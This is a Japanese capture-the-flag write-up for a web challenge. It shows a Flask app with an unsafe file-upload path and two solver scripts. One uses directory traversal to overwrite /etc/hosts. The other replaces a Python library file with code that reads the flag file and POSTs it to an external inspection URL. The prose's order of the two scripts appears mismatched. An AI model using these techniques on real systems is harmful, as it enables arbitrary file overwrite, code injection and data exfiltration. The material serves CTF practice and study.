---
layout: chall
ctf_name: imaginaryctf_2022
problem_name: hostility
genre: web
solved_date: 2022-07-18
during_ctf: false
tag: [directory_traversal,host]
fav: false
difficulty: easy
---

### 概要

<details><summary>コード</summary>

```py
#!/usr/bin/env python3

from requests import get
from flask import Flask, Response, request
from time import sleep
from threading import Thread
from os import _exit

app = Flask(__name__)

class Restart(Thread):
    def run(self):
        sleep(300)
        _exit(0) # killing the server after 5 minutes, and docker should restart it

Restart().start()

@app.route('/')
def index():
    return Response(open(__file__).read(), mimetype='text/plain')

@app.route('/docker')
def docker():
    return Response(open("Dockerfile").read(), mimetype='text/plain')

@app.route('/compose')
def compose():
    return Response(open('docker-compose.yml').read(), mimetype='text/plain')

@app.route('/upload', methods=["GET"])
def upload_get():
    return open("upload.html").read()

@app.route('/upload', methods=["POST"])
def upload_post():
    if "file" not in request.files:
        return "No file submitted!"
    file = request.files['file']
    if file.filename == '':
        return "No file submitted!"
    file.save("./uploads/"+file.filename)
    return f"Saved {file.filename}"

@app.route('/flag')
def check():
    flag = open("flag.txt").read()
    get(f"http://localhost:1337/{flag}")
    return "Flag sent to localhost!"

app.run('0.0.0.0', 1337)
```

</details>


### 解法

自明なディレクトリトラバーサルがある。5 分おきに再起動されるので、まずそのタイミングで読み込まれる何らかのモジュールの `__init__.py` を書き換えることを考えた。

<details><summary>スクリプト</summary>

```py
from itertools import count
from time import sleep, time
import requests

res = requests.post(
  "https://hostility.chal.imaginaryctf.org/upload",
  files={'file':("../../etc/hosts", b'127.0.0.1   example.com')}
)

requests.get("https://hostility.chal.imaginaryctf.org/flag")
```

</details>


これはローカルだと上手く行ったものの、リモートには刺さらなかった。おそらく再起動時の処理が違ったのだろう。正解は `/etc/hosts` の書き換え。問題名に解法のヒントを含めるの、あまり好きではないのでやめてほしいな……

<details><summary>スクリプト</summary>

```py
from itertools import count
from time import sleep, time
import requests

init = time()
for i in count():
  dt = round(time()-init, 2)
  print(f'[+] {dt=}')
  res = requests.post(
    "https://hostility.chal.imaginaryctf.org/upload",
    # "http://localhost:1338/upload",
    files={'file':(
      "../../usr/local/lib/python3.8/dist-packages/requests/__init__.py",
      b'''
import urllib.request

print(f'[+] pwned!')
url = 'https://requestinspector.com/inspect/01g85s4t9q77sty57kf0fyhksy'
urllib.request.urlopen(urllib.request.Request(url, data=open("/app/flag.txt", "rb").read(), method='POST'))
def get(url):
 pass
'''
    )}
  )
  print(res.text)
  sleep(5)
```

</details>

